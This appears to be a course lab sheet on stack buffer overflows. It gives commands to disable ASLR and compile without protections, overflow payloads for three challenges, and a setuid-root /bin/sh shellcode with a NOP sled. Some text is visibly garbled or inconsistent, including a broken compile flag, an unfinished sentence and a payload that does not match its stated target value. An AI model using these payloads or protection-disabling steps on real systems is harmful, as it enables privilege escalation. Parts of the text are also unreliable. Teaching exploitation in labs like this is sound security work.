# Week 2 - Malware and Buffer Overflow

## Challenge 1

Disable ALSR on your machine using `echo 0 | tee /proc/sys/kernel/randomize_va_space`

Compile `challenge1.c` using `gcc challenge1.c -o challenge1 -m32 -fno-stack-protector -z execstack -g`

Run the file with an input that will change the value of modified to something other than 0.

Add a `printf` statements to your code that will print the pointer values for buffer and modified variables.

Run the program several times and observe the pointer values.

Recompile the program without the `-fno-stack-protector`. What changed? Is your attack still possible?

Enable ALSR on your machine and run the program again (modify the command from the beginning of this task). What changed? How ALSR protects against buffer overflow attacks? 

```
./challenge1 aaaaaaaaa
```

## Challenge 2

Disable ALSR on your machine using `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

Compile `challenge2.c` using `gcc challenge2.c -o challenge2 -m32 -fno-stack-protector -z exe<cstack -g`

Run the file with an input that will change the value of modified to 0x0d0a0d0a. 

```
$./challenge2 `python2 -c 'print "A"*64 + "\x0b\x0d\x0b\x0d"'`
```

## Challenge 3

Analyze the code of `challenge3.c`. Compile it using:
````
gcc challenge3.c -o challenge3 -m32 -fno-stack-protector -z execstack -g
```
Your goal is to 


Shell code:
```
\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

Run the file with an input that will cause the winner function to be called. 
```
./challenge3 `python -c 'print "A"*16 + "\xcb\x91\x04\x08"'`
```

```
/challenge3 `python2 -c 'print "\x90"*359 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x30\xd4\xff\xff"'`
```
